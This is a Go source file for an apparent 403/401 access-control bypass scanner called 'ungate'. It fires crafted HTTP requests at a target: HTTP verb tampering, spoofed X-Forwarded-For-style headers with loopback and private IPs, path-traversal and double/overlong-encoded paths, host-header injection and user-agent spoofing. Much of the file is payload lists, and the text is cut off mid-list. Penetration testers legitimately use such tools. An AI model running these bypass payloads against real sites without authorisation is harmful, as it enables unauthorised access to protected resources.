package main

import (
        "crypto/tls"
        "encoding/json"
        "errors"
        "flag"
        "fmt"
        "io"
        "math/rand"
        "net"
        "net/http"
        "net/url"
        "os"
        "strings"
        "sync"
        "sync/atomic"
        "time"
        "unicode"
)

// ─────────────────────────────────────────────────────────────────────────────
// VERSION
// ─────────────────────────────────────────────────────────────────────────────

var (
        version   = "1.0.0"
        buildDate = "2026"
        toolName  = "ungate"
)

// ─────────────────────────────────────────────────────────────────────────────
// TYPES
// ─────────────────────────────────────────────────────────────────────────────

type KV struct {
        Key   string
        Value string
}

type Resp struct {
        StatusCode    int
        ContentLength int
}

type Result struct {
        Technique string
        Payload   string
        SC        int
        CL        int
        IsDefault bool
}

type ScanOpts struct {
        URI        string
        Method     string
        Headers    []KV
        Proxy      *url.URL
        BypassIP   string
        Timeout    int
        Follow     bool
        Stop429    bool
        Techniques []string
        Goroutines int
        Delay      int
        Verbose    bool
}

type scanState struct {
        mu        sync.Mutex
        defaultSC int
        defaultCL int
        calibAvg  int
        calibTol  int
}

func (s *scanState) setDefault(sc, cl int) {
        s.mu.Lock()
        s.defaultSC, s.defaultCL = sc, cl
        s.mu.Unlock()
}

func (s *scanState) interesting(r Result) bool {
        s.mu.Lock()
        defer s.mu.Unlock()
        if s.defaultSC == 0 {
                return true
        }
        if r.SC != s.defaultSC {
                return true
        }
        if s.defaultCL > 0 {
                d := r.CL - s.defaultCL
                if d < 0 {
                        d = -d
                }
                tol := s.calibTol
                if tol == 0 {
                        tol = 50
                }
                if d > tol {
                        return true
                }
        }
        return false
}

// ─────────────────────────────────────────────────────────────────────────────
// COLOR
// ─────────────────────────────────────────────────────────────────────────────

var colorEnabled = true

func initColor() {
        if os.Getenv("NO_COLOR") != "" {
                colorEnabled = false
        }
}

func paint(ansi, s string) string {
        if !colorEnabled {
                return s
        }
        return ansi + s + "\033[0m"
}

func red(s string) string      { return paint("\033[38;5;196m", s) }
func green(s string) string    { return paint("\033[38;5;82m", s) }
func yellow(s string) string   { return paint("\033[38;5;220m", s) }
func cyan(s string) string     { return paint("\033[38;5;51m", s) }
func magenta(s string) string  { return paint("\033[38;5;213m", s) }
func orange(s string) string   { return paint("\033[38;5;208m", s) }
func dim(s string) string      { return paint("\033[38;5;240m", s) }
func bold(s string) string     { return paint("\033[1m", s) }
func hiblack(s string) string  { return paint("\033[38;5;243m", s) }
func bgGreen(s string) string  { return paint("\033[48;5;22m\033[38;5;82m", s) }
func bgRed(s string) string    { return paint("\033[48;5;52m\033[38;5;196m", s) }

func colorCode(code int) string {
        s := fmt.Sprintf("%d", code)
        switch {
        case code >= 200 && code < 300:
                return green(bold(s))
        case code >= 300 && code < 400:
                return yellow(s)
        case code == 400:
                return orange(s)
        case code >= 400 && code < 500:
                return red(s)
        case code >= 500:
                return magenta(s)
        default:
                return hiblack(s)
        }
}

func colorCL(cl int) string {
        s := fmt.Sprintf("%d B", cl)
        switch {
        case cl > 5000:
                return green(s)
        case cl > 1000:
                return cyan(s)
        default:
                return hiblack(s)
        }
}

func techTag(t string) string {
        tags := map[string]string{
                "verb":          paint("\033[48;5;17m\033[38;5;75m", " VERB "),
                "header-ip":     paint("\033[48;5;18m\033[38;5;117m", " HDR-IP "),
                "header-simple": paint("\033[48;5;18m\033[38;5;117m", " HDR "),
                "endpath":       paint("\033[48;5;22m\033[38;5;82m", " EPATH "),
                "midpath":       paint("\033[48;5;22m\033[38;5;119m", " MPATH "),
                "double-enc":    paint("\033[48;5;52m\033[38;5;208m", " DBLENC "),
                "unicode":       paint("\033[48;5;53m\033[38;5;213m", " UNIC "),
                "path-case":     paint("\033[48;5;24m\033[38;5;159m", " CASE "),
                "http-version":  paint("\033[48;5;58m\033[38;5;220m", " HTTP "),
                "useragent":     paint("\033[48;5;56m\033[38;5;183m", " UA "),
                "host-header":   paint("\033[48;5;20m\033[38;5;111m", " HOST "),
                "content-type":  paint("\033[48;5;88m\033[38;5;203m", " CTYPE "),
                "default":       paint("\033[48;5;235m\033[38;5;245m", " BASE "),
        }
        if tag, ok := tags[t]; ok {
                return tag
        }
        return paint("\033[48;5;237m\033[38;5;250m", " "+t+" ")
}

// ─────────────────────────────────────────────────────────────────────────────
// OUTPUT
// ─────────────────────────────────────────────────────────────────────────────

var (
        printMu    sync.Mutex
        outFile    *os.File
        jsonMode   bool
        jsonBuf    []map[string]any
        jsonMu     sync.Mutex
        noBanner   bool
        totalHits  atomic.Int64
        totalFired atomic.Int64
        hitResults []Result
        hitMu      sync.Mutex
)

func initOutput(path string, isJSON bool) error {
        jsonMode = isJSON
        if path != "" {
                f, err := os.Create(path)
                if err != nil {
                        return err
                }
                outFile = f
        }
        return nil
}

func closeOutput() {
        if outFile != nil {
                outFile.Close()
        }
}

func flushJSON() {
        if !jsonMode {
                return
        }
        jsonMu.Lock()
        defer jsonMu.Unlock()
        if len(jsonBuf) == 0 {
                return
        }
        data, _ := json.MarshalIndent(jsonBuf, "", "  ")
        if outFile != nil {
                outFile.Write(data)
                outFile.Write([]byte("\n"))
        } else {
                fmt.Println(string(data))
        }
}

func printBanner(opts ScanOpts) {
        if noBanner {
                return
        }
        fmt.Println(green("  ╦ ╦╔╗╔╔═╗╔═╗╔╦╗╔═╗"))
        fmt.Println(green("  ║ ║║║║║ ╦╠═╣ ║ ║╣ "))
        fmt.Println(green("  ╚═╝╝╚╝╚═╝╩ ╩ ╩ ╚═╝"))
        fmt.Printf("  %s  %s\n\n", dim(toolName+" v"+version), dim("403/401 bypass framework"))
        fmt.Println(dim("  ──────────────────────────────────────────────────"))
        fmt.Printf("  %s  %s\n", dim("target  →"), cyan(opts.URI))
        fmt.Printf("  %s  %s    %s  %s    %s  %d\n\n",
                dim("method  →"), bold(opts.Method),
                dim("timeout →"), dim(fmt.Sprintf("%dms", opts.Timeout)),
                dim("threads →"), opts.Goroutines,
        )
}

func sectionHeader(name string) {
        if noBanner {
                return
        }
        clearProgress()
        fmt.Printf("\n  %s %s\n",
                paint("\033[38;5;28m", "◆"),
                bold(strings.ToUpper(name)),
        )
}

// clearProgress wipes the current "testing…" status line.
func clearProgress() {
        if !colorEnabled {
                return
        }
        fmt.Print("\r\033[2K")
}

// showProgress overwrites the current line with what is being tested right now.
func showProgress(tech, payload string, n, total int) {
        if !colorEnabled || noBanner {
                return
        }
        pl := payload
        if len(pl) > 55 {
                pl = pl[:52] + "..."
        }
        pct := ""
        if total > 0 {
                pct = fmt.Sprintf(" %s/%s", dim(fmt.Sprintf("%d", n)), dim(fmt.Sprintf("%d", total)))
        }
        fmt.Printf("\r  %s %s  %s%s",
                paint("\033[38;5;240m", "→"),
                hiblack(fmt.Sprintf("%-9s", "["+tech+"]")),
                dim(pl),
                pct,
        )
}

func printResult(r Result, defaultCL int) {
        printMu.Lock()
        defer printMu.Unlock()

        totalFired.Add(1)

        if jsonMode {
                jsonMu.Lock()
                jsonBuf = append(jsonBuf, map[string]any{
                        "technique": r.Technique,
                        "payload":   r.Payload,
                        "status":    r.SC,
                        "length":    r.CL,
                })
                jsonMu.Unlock()
                return
        }

        diff := r.CL - defaultCL

        // Build fixed-width columns BEFORE applying color (ANSI codes break %-Ns padding)
        clCol  := fmt.Sprintf("%-9s", fmt.Sprintf("%d B", r.CL))
        var diffCol string
        if defaultCL > 0 && !r.IsDefault {
                diffCol = fmt.Sprintf("%-10s", fmt.Sprintf("%+d B", diff))
        } else {
                diffCol = fmt.Sprintf("%-10s", "")
        }

        payload := r.Payload
        if len(payload) > 60 {
                payload = payload[:57] + "..."
        }

        tag  := techTag(r.Technique)
        isHit := !r.IsDefault && (r.SC < 400 || (defaultCL > 0 && abs(diff) > 200))

        clearProgress()

        if isHit {
                totalHits.Add(1)
                hitMu.Lock()
                hitResults = append(hitResults, r)
                hitMu.Unlock()
                fmt.Printf("  %s %s  %s  %s  %s  %s\n",
                        bgGreen(" HIT "), tag,
                        colorCode(r.SC),
                        green(clCol),
                        green(diffCol),
                        green(payload),
                )
        } else {
                fmt.Printf("  %s %s  %s  %s  %s  %s\n",
                        dim("  ·  "), tag,
                        colorCode(r.SC),
                        hiblack(clCol),
                        hiblack(diffCol),
                        dim(payload),
                )
        }

        if outFile != nil && !jsonMode {
                fmt.Fprintf(outFile, "[%s] %d  %d bytes  %s\n", r.Technique, r.SC, r.CL, r.Payload)
        }
}

func abs(x int) int {
        if x < 0 {
                return -x
        }
        return x
}

func printSummary() {
        clearProgress()
        fmt.Println()
        fmt.Println(dim("  ──────────────────────────────────────────────────"))
        fmt.Printf("  %s   requests %s   hits %s\n",
                green("done"),
                bold(fmt.Sprintf("%d", totalFired.Load())),
                bold(fmt.Sprintf("%d", totalHits.Load())),
        )

        hitMu.Lock()
        defer hitMu.Unlock()
        if len(hitResults) > 0 {
                fmt.Println()
                fmt.Println(bold("  ▶ interesting results"))
                for _, r := range hitResults {
                        diff := r.CL
                        fmt.Printf("    %s %s  %s  %s\n",
                                techTag(r.Technique),
                                colorCode(r.SC),
                                colorCL(diff),
                                green(r.Payload),
                        )
                }
        } else {
                fmt.Printf("  %s\n", dim("no bypasses found"))
        }
        fmt.Println(dim("  ──────────────────────────────────────────────────"))
}

// ─────────────────────────────────────────────────────────────────────────────
// HTTP
// ─────────────────────────────────────────────────────────────────────────────

var ErrRateLimited = errors.New("rate limited (HTTP 429)")

func buildClient(proxy *url.URL, timeoutMs int, follow bool) *http.Client {
        d := time.Duration(timeoutMs) * time.Millisecond
        tr := &http.Transport{
                Proxy:           http.ProxyURL(proxy),
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                DialContext: (&net.Dialer{
                        Timeout:   d,
                        KeepAlive: 30 * time.Second,
                }).DialContext,
                MaxIdleConns:          200,
                IdleConnTimeout:       90 * time.Second,
                TLSHandshakeTimeout:   d,
                ResponseHeaderTimeout: d,
        }
        c := &http.Client{Transport: tr, Timeout: d}
        if !follow {
                c.CheckRedirect = func(*http.Request, []*http.Request) error {
                        return http.ErrUseLastResponse
                }
        }
        return c
}

func doReq(method, rawURL string, headers []KV, proxy *url.URL, timeoutMs int, follow bool) (*Resp, error) {
        if method == "" {
                method = "GET"
        }
        parsed, err := url.Parse(rawURL)
        if err != nil || parsed.Scheme == "" || parsed.Host == "" {
                return nil, fmt.Errorf("invalid URL: %q", rawURL)
        }
        parsed.RawPath = parsed.EscapedPath()
        req := &http.Request{
                Method: method,
                Host:   parsed.Host,
                URL:    parsed,
                Header: make(http.Header),
                Close:  true,
        }
        for _, h := range headers {
                req.Header.Set(h.Key, h.Value)
        }
        resp, err := buildClient(proxy, timeoutMs, follow).Do(req)
        if err != nil {
                return nil, err
        }
        defer resp.Body.Close()
        body, _ := io.ReadAll(resp.Body)
        return &Resp{StatusCode: resp.StatusCode, ContentLength: len(body)}, nil
}

func doReqRetry(method, rawURL string, headers []KV, proxy *url.URL, timeoutMs int, follow bool, stop429 bool) (*Resp, error) {
        var last error
        for attempt := 0; attempt <= 2; attempt++ {
                if attempt > 0 {
                        time.Sleep(time.Duration(1<<uint(attempt)) * 400 * time.Millisecond)
                }
                r, err := doReq(method, rawURL, headers, proxy, timeoutMs, follow)
                if err != nil {
                        last = err
                        if isTransient(err) {
                                continue
                        }
                        return nil, err
                }
                if r.StatusCode == 429 {
                        if stop429 {
                                return r, ErrRateLimited
                        }
                        last = fmt.Errorf("429 attempt %d", attempt)
                        continue
                }
                return r, nil
        }
        return nil, fmt.Errorf("failed after 3 attempts: %w", last)
}

func isTransient(err error) bool {
        s := strings.ToLower(err.Error())
        for _, p := range []string{"timeout", "connection refused", "connection reset", "eof", "no such host"} {
                if strings.Contains(s, p) {
                        return true
                }
        }
        return false
}

// ─────────────────────────────────────────────────────────────────────────────
// SCANNER
// ─────────────────────────────────────────────────────────────────────────────

func RunScan(opts ScanOpts) {
        initColor()
        printBanner(opts)

        state := &scanState{}
        results := make(chan Result, 2000)

        var collDone sync.WaitGroup
        collDone.Add(1)
        go func() {
                defer collDone.Done()
                for r := range results {
                        state.mu.Lock()
                        dcl := state.defaultCL
                        state.mu.Unlock()
                        printResult(r, dcl)
                }
        }()

        sectionHeader("auto-calibration")
        autocalibrate(opts, state)
        state.mu.Lock()
        if state.calibAvg > 0 {
                fmt.Printf("  %s baseline %s  tolerance %s\n\n",
                        green("[✔]"),
                        bold(fmt.Sprintf("%d B", state.calibAvg)),
                        dim(fmt.Sprintf("±%d B", state.calibTol)),
                )
        } else {
                fmt.Printf("  %s calibration skipped\n\n", yellow("[!]"))
        }
        state.mu.Unlock()

        sectionHeader("default request")
        def := defaultRequest(opts, state)
        if def != nil {
                state.mu.Lock()
                dcl := state.defaultCL
                state.mu.Unlock()
                printResult(*def, dcl)
        }
        fmt.Println()

        var wg sync.WaitGroup
        for _, tech := range opts.Techniques {
                switch tech {
                case "verbs":
                        sectionHeader("verb tampering")
                        wg.Add(1)
                        go techVerbs(opts, state, results, &wg)
                case "headers":
                        sectionHeader("header injection")
                        wg.Add(1)
                        go techHeaders(opts, state, results, &wg)
                case "endpaths":
                        sectionHeader("end path bypass")
                        wg.Add(1)
                        go techEndPaths(opts, state, results, &wg)
                case "midpaths":
                        sectionHeader("mid path bypass")
                        wg.Add(1)
                        go techMidPaths(opts, state, results, &wg)
                case "double-encoding":
                        sectionHeader("double encoding")
                        wg.Add(1)
                        go techDoubleEnc(opts, state, results, &wg)
                case "unicode":
                        sectionHeader("unicode encoding")
                        wg.Add(1)
                        go techUnicode(opts, state, results, &wg)
                case "path-case":
                        sectionHeader("path case switching")
                        wg.Add(1)
                        go techPathCase(opts, state, results, &wg)
                case "http-version":
                        sectionHeader("http version bypass")
                        wg.Add(1)
                        go techHTTPVersion(opts, state, results, &wg)
                case "useragent":
                        sectionHeader("user-agent spoofing")
                        wg.Add(1)
                        go techUserAgent(opts, state, results, &wg)
                case "host-header":
                        sectionHeader("host header injection")
                        wg.Add(1)
                        go techHostHeader(opts, state, results, &wg)
                case "content-type":
                        sectionHeader("content-type bypass")
                        wg.Add(1)
                        go techContentType(opts, state, results, &wg)
                default:
                        fmt.Printf("%s unknown technique: %s\n", yellow("[!]"), tech)
                }
                wg.Wait()
                fmt.Println()
        }

        close(results)
        collDone.Wait()
        printSummary()
        flushJSON()
}

func sem(n int) chan struct{}   { return make(chan struct{}, n) }
func sleep(ms int)              { time.Sleep(time.Duration(ms) * time.Millisecond) }

func fire(opts ScanOpts, state *scanState, out chan<- Result, method, rawURL string, hdrs []KV, tech, payload string) {
        // Show live progress BEFORE the request
        showProgress(tech, payload, 0, 0)

        r, err := doReqRetry(method, rawURL, hdrs, opts.Proxy, opts.Timeout, opts.Follow, opts.Stop429)
        if err != nil {
                return
        }
        res := Result{Technique: tech, Payload: payload, SC: r.StatusCode, CL: r.ContentLength}
        // Always send — verbose shows all; default shows interesting + all non-403/401
        if opts.Verbose || state.interesting(res) || res.SC != state.defaultSC {
                out <- res
        }
}

func autocalibrate(opts ScanOpts, state *scanState) {
        base := strings.TrimRight(opts.URI, "/") + "/"
        paths := []string{"calib_zzz_123456", "calib_aaa_789xyz", "calib_notexist_000"}
        var samples []int
        for _, p := range paths {
                r, err := doReqRetry("GET", base+p, opts.Headers, opts.Proxy, opts.Timeout, false, false)
                if err == nil {
                        samples = append(samples, r.ContentLength)
                }
        }
        if len(samples) == 0 {
                return
        }
        sum := 0
        for _, s := range samples {
                sum += s
        }
        avg := sum / len(samples)
        maxDev := 0
        for _, s := range samples {
                d := s - avg
                if d < 0 {
                        d = -d
                }
                if d > maxDev {
                        maxDev = d
                }
        }
        tol := 50
        if maxDev*2 > tol {
                tol = maxDev * 2
        }
        state.mu.Lock()
        state.calibAvg = avg
        state.calibTol = tol
        state.mu.Unlock()
}

func defaultRequest(opts ScanOpts, state *scanState) *Result {
        r, err := doReqRetry(opts.Method, opts.URI, opts.Headers, opts.Proxy, opts.Timeout, opts.Follow, opts.Stop429)
        if err != nil {
                return nil
        }
        state.setDefault(r.StatusCode, r.ContentLength)
        return &Result{Technique: "default", Payload: opts.URI, SC: r.StatusCode, CL: r.ContentLength, IsDefault: true}
}

// ─────────────────────────────────────────────────────────────────────────────
// TECHNIQUES
// ─────────────────────────────────────────────────────────────────────────────

func techVerbs(opts ScanOpts, state *scanState, out chan<- Result, wg *sync.WaitGroup) {
        defer wg.Done()
        s := sem(opts.Goroutines)
        var inner sync.WaitGroup
        for _, m := range payloadMethods {
                method := m
                sleep(opts.Delay)
                s <- struct{}{}
                inner.Add(1)
                go func() {
                        defer inner.Done()
                        defer func() { <-s }()
                        fire(opts, state, out, method, opts.URI, opts.Headers, "verb", method)
                }()
        }
        inner.Wait()
}

func techHeaders(opts ScanOpts, state *scanState, out chan<- Result, wg *sync.WaitGroup) {
        defer wg.Done()
        s := sem(opts.Goroutines)
        var inner sync.WaitGroup

        ips := payloadIPs
        if opts.BypassIP != "" {
                ips = []string{opts.BypassIP}
        }

        for _, hdr := range payloadHeaders {
                for _, ip := range ips {
                        h, i := hdr, ip
                        sleep(opts.Delay)
                        s <- struct{}{}
                        inner.Add(1)
                        go func() {
                                defer inner.Done()
                                defer func() { <-s }()
                                hdrs := append(opts.Headers, KV{h, i})
                                fire(opts, state, out, opts.Method, opts.URI, hdrs, "header-ip", fmt.Sprintf("%s: %s", h, i))
                        }()
                }
        }

        for _, sh := range payloadSimpleHeaders {
                line := sh
                sleep(opts.Delay)
                s <- struct{}{}
                inner.Add(1)
                go func() {
                        defer inner.Done()
                        defer func() { <-s }()
                        parts := strings.SplitN(line, " ", 2)
                        if len(parts) < 2 {
                                return
                        }
                        hdrs := append(opts.Headers, KV{strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])})
                        fire(opts, state, out, opts.Method, opts.URI, hdrs, "header-simple", line)
                }()
        }
        inner.Wait()
}

func techEndPaths(opts ScanOpts, state *scanState, out chan<- Result, wg *sync.WaitGroup) {
        defer wg.Done()
        s := sem(opts.Goroutines)
        base := strings.TrimRight(opts.URI, "/")
        var inner sync.WaitGroup
        for _, p := range payloadEndPaths {
                payload := p
                sleep(opts.Delay)
                s <- struct{}{}
                inner.Add(1)
                go func() {
                        defer inner.Done()
                        defer func() { <-s }()
                        fire(opts, state, out, opts.Method, base+payload, opts.Headers, "endpath", base+payload)
                }()
        }
        inner.Wait()
}

func techMidPaths(opts ScanOpts, state *scanState, out chan<- Result, wg *sync.WaitGroup) {
        defer wg.Done()
        parsed, err := url.Parse(opts.URI)
        if err != nil {
                return
        }
        pathVal := parsed.Path
        if pathVal == "" || pathVal == "/" {
                return
        }
        trimmed := strings.Trim(pathVal, "/")
        segs := strings.Split(trimmed, "/")
        lastSeg := segs[len(segs)-1]
        basePath := "/"
        if len(segs) > 1 {
                basePath = "/" + strings.Join(segs[:len(segs)-1], "/") + "/"
        }
        baseURL := parsed.Scheme + "://" + parsed.Host
        query := ""
        if parsed.RawQuery != "" {
                query = "?" + parsed.RawQuery
        }
        s := sem(opts.Goroutines)
        var inner sync.WaitGroup
        for _, p := range payloadMidPaths {
                payload := p
                sleep(opts.Delay)
                s <- struct{}{}
                inner.Add(1)
                go func() {
                        defer inner.Done()
                        defer func() { <-s }()
                        target := baseURL + basePath + payload + lastSeg + query
                        fire(opts, state, out, opts.Method, target, opts.Headers, "midpath", target)
                }()
        }
        inner.Wait()
}

func techDoubleEnc(opts ScanOpts, state *scanState, out chan<- Result, wg *sync.WaitGroup) {
        defer wg.Done()
        parsed, err := url.Parse(opts.URI)
        if err != nil {
                return
        }
        origPath := parsed.Path
        if origPath == "" || origPath == "/" {
                return
        }
        s := sem(opts.Goroutines)
        var inner sync.WaitGroup
        for i, c := range origPath {
                if c == '/' {
                        continue
                }
                idx, ch := i, c
                sleep(opts.Delay)
                s <- struct{}{}
                inner.Add(1)
                go func() {
                        defer inner.Done()
                        defer func() { <-s }()
                        single := fmt.Sprintf("%%%X", ch)
                        double := url.QueryEscape(single)
                        modPath := origPath[:idx] + double + origPath[idx+len(string(ch)):]
                        target := fmt.Sprintf("%s://%s%s", parsed.Scheme, parsed.Host, modPath)
                        if parsed.RawQuery != "" {
                                target += "?" + parsed.RawQuery
                        }
                        fire(opts, state, out, opts.Method, target, opts.Headers, "double-enc", target)
                }()
        }
        inner.Wait()
}

func techUnicode(opts ScanOpts, state *scanState, out chan<- Result, wg *sync.WaitGroup) {
        defer wg.Done()
        parsed, err := url.Parse(opts.URI)
        if err != nil {
                return
        }
        origPath := parsed.Path
        if origPath == "" || origPath == "/" {
                return
        }
        baseURL := parsed.Scheme + "://" + parsed.Host
        query := ""
        if parsed.RawQuery != "" {
                query = "?" + parsed.RawQuery
        }
        var targets []string
        for _, enc := range []string{"%c0%af", "%u002f", "%e0%80%af", "%252f"} {
                if len(origPath) > 1 && strings.Contains(origPath[1:], "/") {
                        mod := "/" + strings.ReplaceAll(origPath[1:], "/", enc)
                        targets = append(targets, baseURL+mod+query)
                }
        }
        segs := strings.Split(strings.Trim(origPath, "/"), "/")
        lastSeg := segs[len(segs)-1]
        bp := "/"
        if len(segs) > 1 {
                bp = "/" + strings.Join(segs[:len(segs)-1], "/") + "/"
        }
        for i, c := range lastSeg {
                targets = append(targets, baseURL+bp+lastSeg[:i]+fmt.Sprintf("%%u%04x", c)+lastSeg[i+len(string(c)):]+query)
                if c < 128 {
                        b1 := byte(0xC0) | byte(c>>6)
                        b2 := byte(0x80) | byte(c&0x3F)
                        targets = append(targets, baseURL+bp+lastSeg[:i]+fmt.Sprintf("%%%02x%%%02x", b1, b2)+lastSeg[i+len(string(c)):]+query)
                }
        }
        s := sem(opts.Goroutines)
        var inner sync.WaitGroup
        for _, t := range targets {
                target := t
                sleep(opts.Delay)
                s <- struct{}{}
                inner.Add(1)
                go func() {
                        defer inner.Done()
                        defer func() { <-s }()
                        fire(opts, state, out, opts.Method, target, opts.Headers, "unicode", target)
                }()
        }
        inner.Wait()
}

func caseCombos(s string) []string {
        if len(s) == 0 {
                return []string{""}
        }
        if len(s) > 12 {
                return []string{strings.ToUpper(s), strings.ToLower(s)}
        }
        lo := string(unicode.ToLower(rune(s[0])))
        hi := string(unicode.ToUpper(rune(s[0])))
        rest := caseCombos(s[1:])
        var out []string
        for _, c := range []string{lo, hi} {
                for _, r := range rest {
                        out = append(out, c+r)
                }
        }
        return out
}

func techPathCase(opts ScanOpts, state *scanState, out chan<- Result, wg *sync.WaitGroup) {
        defer wg.Done()
        parsed, err := url.Parse(opts.URI)
        if err != nil {
                return
        }
        uriPath := strings.Trim(parsed.Path, "/")
        if uriPath == "" {
                return
        }
        baseURL := parsed.Scheme + "://" + parsed.Host
        query := ""
        if parsed.RawQuery != "" {
                query = "?" + parsed.RawQuery
        }
        combos := caseCombos(uriPath)
        rand.Shuffle(len(combos), func(i, j int) { combos[i], combos[j] = combos[j], combos[i] })
        if len(combos) > 30 {
                combos = combos[:30]
        }
        s := sem(opts.Goroutines)
        var inner sync.WaitGroup
        for _, c := range combos {
                combo := c
                sleep(opts.Delay)
                s <- struct{}{}
                inner.Add(1)
                go func() {
                        defer inner.Done()
                        defer func() { <-s }()
                        target := baseURL + "/" + combo + query
                        fire(opts, state, out, opts.Method, target, opts.Headers, "path-case", target)
                }()
        }
        inner.Wait()
}

func techUserAgent(opts ScanOpts, state *scanState, out chan<- Result, wg *sync.WaitGroup) {
        defer wg.Done()
        s := sem(opts.Goroutines)
        var inner sync.WaitGroup
        for _, ua := range payloadUserAgents {
                agent := ua
                sleep(opts.Delay)
                s <- struct{}{}
                inner.Add(1)
                go func() {
                        defer inner.Done()
                        defer func() { <-s }()
                        hdrs := make([]KV, 0, len(opts.Headers))
                        for _, h := range opts.Headers {
                                if !strings.EqualFold(h.Key, "user-agent") {
                                        hdrs = append(hdrs, h)
                                }
                        }
                        hdrs = append(hdrs, KV{"User-Agent", agent})
                        fire(opts, state, out, opts.Method, opts.URI, hdrs, "useragent", agent)
                }()
        }
        inner.Wait()
}

func techHostHeader(opts ScanOpts, state *scanState, out chan<- Result, wg *sync.WaitGroup) {
        defer wg.Done()
        parsed, _ := url.Parse(opts.URI)
        orig := parsed.Host
        altHosts := []string{
                "localhost", "127.0.0.1",
                orig + ":80", orig + ":443", orig + ":8080",
                "admin." + orig, "internal." + orig,
                orig + ".bypass.local",
        }
        s := sem(opts.Goroutines)
        var inner sync.WaitGroup
        for _, h := range altHosts {
                host := h
                s <- struct{}{}
                inner.Add(1)
                go func() {
                        defer inner.Done()
                        defer func() { <-s }()
                        hdrs := append(opts.Headers, KV{"Host", host})
                        fire(opts, state, out, opts.Method, opts.URI, hdrs, "host-header", "Host: "+host)
                }()
        }
        inner.Wait()
}

func techContentType(opts ScanOpts, state *scanState, out chan<- Result, wg *sync.WaitGroup) {
        defer wg.Done()
        s := sem(opts.Goroutines)
        var inner sync.WaitGroup
        for _, ct := range payloadContentTypes {
                ctype := ct
                s <- struct{}{}
                inner.Add(1)
                go func() {
                        defer inner.Done()
                        defer func() { <-s }()
                        hdrs := append(opts.Headers, KV{"Content-Type", ctype})
                        fire(opts, state, out, opts.Method, opts.URI, hdrs, "content-type", "Content-Type: "+ctype)
                }()
        }
        inner.Wait()
}

func techHTTPVersion(opts ScanOpts, state *scanState, out chan<- Result, wg *sync.WaitGroup) {
        defer wg.Done()
        hdrs := append(opts.Headers, KV{"Connection", "close"})
        fire(opts, state, out, opts.Method, opts.URI, hdrs, "http-version", "Connection: close (HTTP/1.0 sim)")
}

// ─────────────────────────────────────────────────────────────────────────────
// PAYLOADS
// ─────────────────────────────────────────────────────────────────────────────

var payloadHeaders = []string{
        "Access-Control-Allow-Origin", "Base-Url", "CF-Connecting-IP", "CF-Connecting_IP",
        "CF-True-Client-IP", "Client-IP", "Cluster-Client-IP", "Destination",
        "Forwarded", "Forwarded-For", "Forwarded-For-Ip", "Forwarded-Proto",
        "Host", "Http-Url", "Incap-Client-IP", "Origin",
        "Proxy", "Proxy-Client-IP", "Proxy-Host", "Proxy-Url",
        "Real-Ip", "Redirect", "Referer", "Referrer",
        "Request-Uri", "True-Client-IP", "Uri", "Url",
        "WL-Proxy-Client-IP", "X-Api-Version", "X-Arbitrary",
        "X-Azure-ClientIP", "X-Azure-SocketIP",
        "X-Client-IP", "X-Cluster-Client-IP", "X-Custom-IP-Authorization",
        "X-Envoy-External-Address", "X-F5-IP", "X-Forwarded",
        "X-Forwarded-By", "X-Forwarded-For", "X-Forwarded-For-IP",
        "X-Forwarded-For-Original", "X-Forward", "X-Forward-For",
        "X-Forwarded-Host", "X-Forwarded-IP", "X-Forwarded-Proto",
        "X-Forwarded-Server", "X-Forwarded-Ssl", "X-Forwarder-For",
        "X-From-IP", "X-Host", "X-HTTP-DestinationURL", "X-HTTP-Host-Override",
        "X-Nginx-Client-IP", "X-Original-Remote-Addr", "X-Original-URL",
        "X-Originally-Forwarded-For", "X-Originating-IP", "X-Override-URL",
        "X-Proxy-Url", "X-ProxyUser-Ip", "X-Real-IP", "X-Real-Ip",
        "X-Referrer", "X-Remote-Addr", "X-Remote-IP", "X-Rewrite-URL",
        "X-True-IP", "X-WAP-Profile",
        "Fastly-Client-IP", "Fastly-SSL", "Akamai-Origin-Hop",
        "Akamai-Client-IP", "CDN-Loop", "Section-Io-Id",
        "X-BB-CLIENT-IP", "X-Sucuri-Clientip", "X-Sucuri-Country",
        "X-Iinfo", "INCAP-CLIENT-IP", "X-Cdn-Client-IP",
        "X-Cdn-Src-Ip", "X-Cdn-User-IP",
        "X-LB-IP", "X-HA-Remote-IP", "X-NginX-Proxy",
        "X-Upstream", "X-Backend-URL", "X-Balancer-IP",
        "X-Url-Scheme", "X-Http-Method-Override", "X-Forwarded-Scheme",
        "X-Correlation-ID", "X-Request-ID", "X-Trace-ID",
}

var payloadIPs = []string{
        "*", "0", "null", "undefined", "none",
        "0.0.0.0", "127.0.0.1", "127.0.0.2", "127.0.1.1",
        "127.1", "127.1.1.1", "0177.1",
        "0177.0000.0000.0001", "0x7F000001",
        "2130706433",
        "::1", "[::1]", "[::]", "::",
        "::ffff:127.0.0.1", "::ffff:7f00:1",
        "10.0.0.0", "10.0.0.1", "10.0.0.2", "10.0.0.254",
        "10.1.1.1", "10.10.10.10", "10.255.255.255",
        "172.16.0.0", "172.16.0.1", "172.16.255.255",
        "172.17.0.1", "172.18.0.1", "172.19.0.1",
        "172.20.0.1", "172.31.255.255",
        "192.168.0.1", "192.168.0.2", "192.168.1.0",
        "192.168.1.1", "192.168.1.254", "192.168.255.255",
        "localhost", "localhost:80", "localhost:443",
        "localhost:8080", "localhost:8443",
        "8.8.8.8", "1.1.1.1", "35.191.0.0", "130.211.0.0",
}

var payloadEndPaths = []string{
        "%00", "%09", "%0A", "%0D", "%20", "%20/",
        "%2500", "%2509", "%250A", "%250D", "%2520", "%2520%252F",
        "/..", "/../", "/..;/", "..;/", "..", "../",
        "/.%2e/", "/%2e%2e/", "/%2e%2e", "%2e%2e/", "%2e/",
        "/..%2f", "/..%5c", "/%252e%252e/",
        "/.%252e/", "%2f%2e%2e", "%2f%2e%2e%2f",
        "/.%2e%2f", "/%2e%2e%5c",
        ";", ";/", ";;", ";foo", ";.js",
        ";%2f..%2f..%2f", ";%09", ";%20",
        "/", "//", "///", "//./", "/./",
        "?", "??", "?&", "#", "#/", "#/./", "#test",
        "%25", "%23", "%26", "%3f", "%61",
        "%2525", "%2523", "%2526", "%253F", "%2561",
        ".css", ".html", ".json", ".php", ".xml",
        ".js", ".txt", ".aspx", ".asp", ".do",
        ".action", ".jsp", ".jspx", ".svc",
        ".svc?wsdl", ".wsdl", ".random",
        "?debug=1", "?debug=true", "?test=1",
        "?v=1", "?ver=1.0", "?cache=false",
        "?param", "?testparam", "?_=1",
        "?bypass=1", "?admin=1", "?auth=bypass",
        "?format=json", "?format=xml",
        "?callback=x", "?jsonp=x",
